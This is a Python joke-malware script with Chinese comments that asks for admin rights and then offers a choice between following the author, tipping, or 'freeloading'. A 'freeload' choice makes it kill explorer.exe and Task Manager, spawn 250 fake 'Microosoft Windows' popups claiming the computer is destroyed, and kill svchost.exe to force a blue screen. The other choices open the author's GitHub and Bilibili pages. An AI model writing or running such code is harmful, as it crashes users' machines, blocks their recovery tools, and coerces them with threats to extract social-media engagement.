import tkinter as tk
import random,threading,time,easygui,pygame,os,sys,ctypes,webbrowser
pygame.mixer.init()
#准备各种库
#现在最好关掉
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
if not is_admin():
    # 重新启动脚本并请求管理员权限
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    sys.exit(-2)
M = easygui.buttonbox("人生路上最重要的选择,你要对作者",
                      choices = ["关注","投币","白嫖"])
                    #选关注和投币都可以阻止运行
if M == "白嫖" or M == None:
    easygui.msgbox("你废了")
    #询问
    os.system("taskkill /f /im explorer.exe")
    #防止用户关机或重启，关掉桌面
    pygame.mixer.music.load("病毒阴乐.mp3")
    pygame.mixer.music.play()
    #音乐播放
    def boom():
        window = tk.Tk()
        width = window.winfo_screenwidth()
        height = window.winfo_screenheight()
        a = random.randrange(0, width)
        b = random.randrange(0, height)
        window.title('Microosoft Windows')
        window.geometry("200x50" + "+" + str(a) + "+" + str(b))
        tk.Label(window, text='你的电脑被我毁了', bg='blue',
        font=('宋体', 17), width=20, height=4).pack()
        window.mainloop()
    #相关设置⚙
    threads = []
    for i in range(250):
        t = threading.Thread(target=boom)
        threads.append(t)
        time.sleep(0.1)
        threads[i].start()
        os.system("taskkill /f /t /im  taskmgr.exe")
        #禁止任务管理器
    else:
        #弹出窗口
        pygame.mixer.music.stop()
        #结束音乐🎵
        os.system("taskkill /f /t /im  svchost.exe")
        #蓝屏
        sys.exit(-1)
        #蓝屏了，退出程序
        #这个做品应该很简单
else:
    url1 = 'https://github.com/GY-GZW'
    url2 = 'https://space.bilibili.com/3546584528718081'
    webbrowser.open(url1, new=1)
    webbrowser.open(url2, new=1)
    easygui.msgbox("感谢你这么做\n将为您退出")
    sys.exit(0)
    #没白嫖正常结束程序